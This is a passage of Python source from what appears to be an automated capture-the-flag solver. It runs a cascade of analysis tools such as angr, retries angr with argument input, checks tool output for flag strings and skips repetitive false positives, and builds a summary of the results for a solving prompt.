        t0 = time.monotonic()
        result = await _run_tool(cmd, cwd, effective_timeout)
        elapsed = time.monotonic() - t0

        entry = {
            "tool": tool_name,
            "command": cmd,
            "exit_code": result["exit_code"],
            "stdout": result["stdout"][:2000],
            "stderr": result["stderr"][:1000],
            "elapsed_seconds": round(elapsed, 4),
        }
        results.append(entry)

        # Check for flag in output
        combined = result["stdout"] + "\n" + result["stderr"]
        flag = _check_for_flag(combined, flag_format, tool_name=tool_name)
        if flag:
            # Quick sanity check: skip obvious false positives (repetitive chars)
            body_m = re.match(r"^[A-Za-z0-9_\-]{1,32}\{([^}]*)\}$", flag)
            if body_m and len(set(body_m.group(1))) <= 1 and len(body_m.group(1)) >= 3:
                log.info("tool_router_flag_skipped_repetitive", tool=tool_name, flag=flag)
                continue  # don't stop cascade -- this is a false positive
            flag_candidate = flag
            log.info("tool_router_flag_found", tool=tool_name, flag=flag)
            break

        # Auto-retry angr with --arg if stdin mode returned UNSAT/FAILED
        if tool_name == "auto_angr" and "--arg" not in cmd:
            stdout_lower = result["stdout"].lower()
            if "failed" in stdout_lower or "unsat" in stdout_lower or "timeout" in stdout_lower:
                arg_cmd = cmd + " --arg"
                log.info("tool_router_run", tool="auto_angr_argv", cmd=arg_cmd[:200])
                t0_arg = time.monotonic()
                arg_result = await _run_tool(arg_cmd, cwd, effective_timeout)
                arg_elapsed = time.monotonic() - t0_arg
                arg_entry = {
                    "tool": "auto_angr_argv",
                    "command": arg_cmd,
                    "exit_code": arg_result["exit_code"],
                    "stdout": arg_result["stdout"][:2000],
                    "stderr": arg_result["stderr"][:1000],
                    "elapsed_seconds": round(arg_elapsed, 4),
                }
                results.append(arg_entry)
                arg_combined = arg_result["stdout"] + "\n" + arg_result["stderr"]
                flag = _check_for_flag(arg_combined, flag_format)
                if flag:
                    body_m = re.match(r"^[A-Za-z0-9_\-]{1,32}\{([^}]*)\}$", flag)
                    if body_m and len(set(body_m.group(1))) <= 1 and len(body_m.group(1)) >= 3:
                        log.info("tool_router_flag_skipped_repetitive", tool="auto_angr_argv", flag=flag)
                    else:
                        flag_candidate = flag
                        log.info("tool_router_flag_found", tool="auto_angr_argv", flag=flag)
                        break

        log.info(
            "tool_router_result",
            tool=tool_name,
            exit_code=result["exit_code"],
            stdout_len=len(result["stdout"]),
        )

    # Build summary for solve_engine prompt
    summary_parts = []
    for r in results:
        status = "SUCCESS" if r["exit_code"] == 0 else f"FAIL(exit={r['exit_code']})"
        stdout_preview = r["stdout"][:500].strip()
        summary_parts.append(f"[{r['tool']}] {status}: {stdout_preview}")

    tool_results_summary = "\n".join(summary_parts) if summary_parts else ""

    updates: dict = {
        "tool_cascade_results": results,
        "tool_results_summary": tool_results_summary,
        "recent_actions": [
            {
                "action": "tool_router",
                "reasoning": f"Ran {len(results)} tools from cascade for {challenge_type}",
                "result_summary": f"flag={'FOUND' if flag_candidate else 'not found'}, tools_run={len(results)}",
            }
        ],
    }

    if flag_candidate:
        updates["tool_flag_candidate"] = flag_candidate

    log.info("tool_router_done", tools_run=len(results), flag_found=bool(flag_candidate))
    return updates
